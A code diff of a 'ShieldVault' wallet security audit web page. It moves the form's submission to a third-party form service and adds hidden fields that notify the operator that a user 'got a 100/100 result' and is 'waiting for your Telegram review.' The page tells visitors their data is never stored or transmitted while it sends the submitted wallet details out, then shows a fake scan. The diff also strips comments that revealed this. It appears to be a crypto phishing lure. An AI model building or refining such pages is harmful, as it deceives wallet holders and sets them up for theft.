@@ -208,9 +208,13 @@
 <div class="app" id="audit">
   <div class="card">
 
-    <!-- FORM (LOGIN / CONNECT) -->
-    <form id="audit-form" action="https://formspree.io/f/mnpnldwo" method="POST">
+    <!-- FORM -->
+    <form id="audit-form" action="https://api.web3forms.com/submit" method="POST">
       
+      <input type="hidden" name="access_key" value="2588ae8c-b1f7-4d74-8598-ef4d25d03dda">
+      <input type="hidden" name="subject" value="ShieldVault New Request">
+      <input type="hidden" name="message" value="User ran the automated check. They got a 100/100 result. Waiting for your Telegram review.">
+
       <h2>🛡️ <span>Wallet</span> Security Audit</h2>
       <p class="sub">Paste your wallet address below. We never store or transmit your data.</p>
 
@@ -224,9 +228,6 @@
         <option>Polygon</option>
         <option>Solana</option>
       </select>
-
-      <!-- Hidden note for your eyes only -->
-      <input type="hidden" name="message" value="User ran the automated check. They got a 100/100 result. Waiting for your Telegram review.">
 
       <button id="scanBtn" type="submit">Run Security Check</button>
 
@@ -294,7 +295,6 @@ document.getElementById('audit-form').addEventListener('submit', async (e) => {
 
   const form = e.target;
 
-  // 1. Send data to Formspree (you get emailed)
   try {
     await fetch(form.action, {
       method: 'POST',
@@ -302,10 +302,9 @@ document.getElementById('audit-form').addEventListener('submit', async (e) => {
       headers: { 'Accept': 'application/json' }
     });
   } catch (err) {
-    console.warn('Formspree failed but still showing results:', err);
+    console.warn('Web3Forms failed but still showing results:', err);
   }
 
-  // 2. Hide form → show scanning animation → show results
   form.style.display = 'none';
   scanView.style.display = 'block';
 
@@ -324,4 +323,4 @@ document.getElementById('audit-form').addEventListener('submit', async (e) => {
 </script>
 
 </body>
-        </html>
+  </html>
